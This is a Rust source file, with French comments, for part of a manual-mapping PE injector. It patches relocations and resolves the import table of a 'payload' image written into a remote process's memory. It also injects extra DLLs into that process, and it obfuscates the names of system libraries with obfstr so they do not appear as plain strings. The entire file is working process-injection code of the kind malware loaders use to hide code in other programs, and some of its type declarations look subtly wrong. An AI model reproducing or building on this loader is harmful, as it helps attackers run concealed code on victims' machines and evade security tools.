use winapi::um::winnt::{
    IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_BASE_RELOCATION,
    IMAGE_IMPORT_DESCRIPTOR, IMAGE_THUNK_DATA64, IMAGE_REL_BASED_DIR64
};
use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress};
use std::ptr;
use obfstr::obfstr;
use crate::utils::resolve_rva;
use super::inject_remote_dll; 

// Gère les patchs d'adresses si l'image n'est pas à sa base préférée
pub unsafe fn apply_relocations(h_process: winapi::ctypes::c_void, payload: &[u8], dest_addr: usize, delta: isize, nt_headers: &IMAGE_NT_HEADERS64, section_ptr: *const IMAGE_SECTION_HEADER) {
    let reloc_dir = nt_headers.OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.Size == 0 { return; }

    let mut offset = resolve_rva(nt_headers, section_ptr, reloc_dir.VirtualAddress);
    let mut block = (payload.as_ptr() as usize + offset) as *const IMAGE_BASE_RELOCATION;

    while (*block).SizeOfBlock > 0 {
        let count = ((*block).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
        let data = (block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;

        for i in 0..count {
            let entry = *data.offset(i as isize);
            if (entry >> 12) == IMAGE_REL_BASED_DIR64 {
                let target_rva = (*block).VirtualAddress as usize + (entry & 0x0FFF) as usize;
                let patch_addr = (dest_addr + target_rva) as *mut u64;
                let mut val: u64 = 0;
                ReadProcessMemory(h_process, patch_addr as *const _, &mut val as *mut _ as *mut _, 8, ptr::null_mut());
                let patched = (val as isize + delta) as u64;
                WriteProcessMemory(h_process, patch_addr as *mut _, &patched as *const _ as *const _, 8, ptr::null_mut());
            }
        }
        offset += (*block).SizeOfBlock as usize;
        block = (payload.as_ptr() as usize + offset) as *const IMAGE_BASE_RELOCATION;
    }
}

// Résout les dépendances et injecte les DLL manquantes
pub unsafe fn resolve_imports(h_process: winapi::ctypes::c_void, payload: &[u8], dest_addr: usize, nt_headers: &IMAGE_NT_HEADERS64, section_ptr: *const IMAGE_SECTION_HEADER) {
    let import_dir = nt_headers.OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    if import_dir.Size == 0 { return; }

    let mut desc_offset = resolve_rva(nt_headers, section_ptr, import_dir.VirtualAddress);
    let mut import_desc = (payload.as_ptr() as usize + desc_offset) as *const IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let dll_name_ptr = (payload.as_ptr() as usize + resolve_rva(nt_headers, section_ptr, (*import_desc).Name)) as *const i8;
        let dll_str = std::ffi::CStr::from_ptr(dll_name_ptr).to_string_lossy();

        // On injecte si c'est pas une DLL système standard
        if !dll_str.to_lowercase().contains(obfstr!("kernel32.dll")) && !dll_str.to_lowercase().contains(obfstr!("ntdll.dll")) {
            super::inject_remote_dll(h_process, &dll_str);
        }

        let h_dll = LoadLibraryA(dll_name_ptr);
        if !h_dll.is_null() {
            let mut thunk_ptr = (payload.as_ptr() as usize + resolve_rva(nt_headers, section_ptr, *(*import_desc).u.OriginalFirstThunk())) as *const IMAGE_THUNK_DATA64;
            let mut dest_thunk = (dest_addr + (*import_desc).FirstThunk as usize) as *mut u64;

            while *(*thunk_ptr).u1.AddressOfData() != 0 {
                let func_addr = if (*(*thunk_ptr).u1.Ordinal() & 0x8000000000000000) != 0 {
                    GetProcAddress(h_dll, ((*(*thunk_ptr).u1.Ordinal() & 0xFFFF) as u64) as *const i8)
                } else {
                    let name_ptr = (payload.as_ptr() as usize + resolve_rva(nt_headers, section_ptr, *(*thunk_ptr).u1.AddressOfData() as u32) + 2) as *const i8;
                    GetProcAddress(h_dll, name_ptr)
                };

                if !func_addr.is_null() {
                    WriteProcessMemory(h_process, dest_thunk as *mut _, &func_addr as *const _ as *const _, 8, ptr::null_mut());
                }
                thunk_ptr = thunk_ptr.offset(1);
                dest_thunk = dest_thunk.offset(1);
            }
        }
        import_desc = import_desc.offset(1);
    }
}
